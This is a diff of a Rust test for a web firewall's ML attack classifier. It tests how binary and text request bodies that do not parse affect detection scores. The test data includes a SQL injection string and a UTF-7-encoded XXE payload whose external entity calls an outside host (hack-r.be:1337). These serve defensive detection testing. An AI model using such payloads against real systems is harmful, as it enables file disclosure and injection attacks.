@@ -257,28 +257,57 @@ fn a_cookie_value_cannot_make_the_classifier_block_but_the_veto_still_sees_it() 
     );
 }
 
-/// A raw body that is neither a form nor JSON (analytics beacons, bot-manager
-/// telemetry, binary payloads) was the largest remaining source of classifier
-/// false positives once cookies were out. It still counts for the veto; only
-/// parsed fields may add to the score.
+/// An unparsed raw body was the largest remaining source of classifier false
+/// positives once cookies were out, and 86% of those bodies were binary
+/// (protobuf, gzip). A binary body still counts for the veto but cannot add to
+/// the score; a text body that does not parse still adds, because that is the
+/// only ML coverage an XML or unknown-type body gets (GoTestWAF's UTF-7 XXE and
+/// XML injections were lost when it did not), and parsed fields still add.
 #[test]
-fn an_unparsed_body_counts_for_the_veto_only_and_parsed_fields_still_add() {
+fn a_binary_unparsed_body_counts_for_the_veto_only_and_text_still_adds() {
     let engine = sentinel_ml::MlEngine::new(64, 1_000_000, None);
-    let raw = engine.evaluate(&ctx(
+    // 256 pseudo-random bytes read as Latin-1 (so valid UTF-8): the shape of the
+    // compressed and protobuf beacons on real traffic, which the model scores
+    // ~1.0 on their punctuation alone.
+    let mut x: u32 = 0x9E37_79B9;
+    let binary_body: String = (0..256)
+        .map(|_| {
+            x ^= x << 13;
+            x ^= x >> 17;
+            x ^= x << 5;
+            char::from((x >> 24) as u8)
+        })
+        .collect();
+    let binary = engine.evaluate(&ctx(
         "/api/x",
-        Some("application/json"),
-        Some(r#"{"q": "1' OR 1=1-- "#),
+        Some("application/x-protobuf"),
+        Some(&binary_body),
     ));
     assert!(
-        raw.payload_attack_score >= DETECTION_MIN,
-        "the veto must see it ({})",
-        raw.payload_attack_score
+        binary.payload_attack_score >= DETECTION_MIN,
+        "the veto must keep seeing the binary body ({})",
+        binary.payload_attack_score
     );
     assert!(
-        raw.combined_score < DETECTION_MIN,
-        "an unparsed body added to the score ({})",
-        raw.combined_score
+        binary.combined_score < DETECTION_MIN,
+        "a binary body added to the score ({})",
+        binary.combined_score
     );
+
+    for (ct, body) in [
+        ("application/json", r#"{"q": "1' OR 1=1-- "#),
+        (
+            "text/xml",
+            "<?xml version=\"1.0\" encoding=\"UTF-7\"?>\n+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4\n+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+\n+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4\n",
+        ),
+    ] {
+        let text = engine.evaluate(&ctx("/api/x", Some(ct), Some(body)));
+        assert!(
+            text.combined_score >= DETECTION_MIN,
+            "{ct} unparsed text body must still add ({})",
+            text.combined_score
+        );
+    }
 
     for (ct, body) in [
         (
